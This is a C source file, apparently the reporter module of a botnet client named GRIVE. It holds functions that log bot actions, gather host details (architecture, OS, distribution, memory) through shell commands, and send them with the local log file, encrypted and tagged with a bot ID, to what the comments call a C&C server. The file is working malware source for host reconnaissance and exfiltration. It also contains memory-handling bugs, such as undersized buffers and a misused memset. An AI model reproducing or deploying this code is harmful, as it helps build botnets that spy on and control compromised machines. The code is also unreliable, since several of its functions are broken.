#include "reporter.h"
#include"security.h"
#include <arpa/inet.h>
#include <stdio.h>
#include<stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <errno.h>


// printlog : the function of logging locally all the action performed on the device   
char* log_editor(char *action, bool success){
    char* log;
    log = (char*) malloc(sizeof(char)* (strlen(action)+21));
    memset(log, 0, sizeof(log));
    sprintf(log, "action: %s, success: %d-", action, success);
    return log;
}

void printLog(char* log){

    time_t seconds;
    seconds = time(NULL);
    struct tm *ptm = localtime(&seconds);

    FILE* logfile = fopen("/home/GRIVE_logfile.txt", "a");
    if(logfile != NULL)
     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s\n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
           ptm->tm_min, ptm->tm_sec, log);
        fclose(logfile);

}
// send_msg : function to send messages to the server: we only put the bot id at the begining

bool send_msg(int sockfd, char* m, int BOT_ID){
   char* msg;
   msg = (char*) malloc(sizeof(char)* (strlen(m)+7));
   sprintf(msg, "[%d] %s", BOT_ID, m);
   printf("%s\n", msg);
    int len =  strlen(msg);
    int enc_len = len/16;
    if (len%16 != 0)
     enc_len++;
     enc_len = enc_len*24;
   // compute the size of the encoded msg 
     if (!send(sockfd, encrypt_encode( msg, strlen(msg)), enc_len, 0))
        return false;
    return true;
}

// send_log: C function to send logs to the C&C server

bool send_log(int sockfd, char* log, int BOT_ID){

    char *m;
    m = (char*) malloc(sizeof(char)* (strlen(log)+6));
    sprintf(m, "log:%s\n", log);

    if(!send_msg(sockfd, m, BOT_ID)){
        free(m);
        return false;
    }
    free(m);
    return true;

}


bool system_info(int sockfd, int BOT_ID){
  // collect the system information on a temp file then send them to the bot
  FILE *fp;
  char* path = (char*) malloc(50*sizeof(char));

  /* Open the command for reading. */

// send the architecture type
  fp = popen("/bin/echo 'Arch: ' $(uname -m);", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send_msg(sockfd, path, BOT_ID);
// send the operationg system
  fp = popen("/bin/echo 'OS: ' $(uname);", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send_msg(sockfd, path, BOT_ID);
// send the linux distribution name of the machine
    fp = popen("/bin/grep ^ID= /etc/os-release ;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send_msg(sockfd, path, BOT_ID);
// send the total amount of ram memory
    fp = popen("/bin/grep MemTotal /proc/meminfo;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send_msg(sockfd, path, BOT_ID);
// send the free amount of ram memory
  fp = popen("/bin/grep MemFree /proc/meminfo;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
    fgets(path, 50*sizeof(char), fp);
  send_msg(sockfd, path, BOT_ID);
  free(path);
  /* close */
  pclose(fp);

  return 0;
}

bool report(int sockfd, int BOT_ID){
    
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    fp = fopen("/home/GRIVE_logfile.txt", "r");
    if (fp == NULL)
        return 0;

    while ((read = getline(&line, &len, fp)) != -1) {
            send_msg(sockfd, line, BOT_ID);
    }
    fclose(fp);
    if (line)
    free(line);
    return 1;

}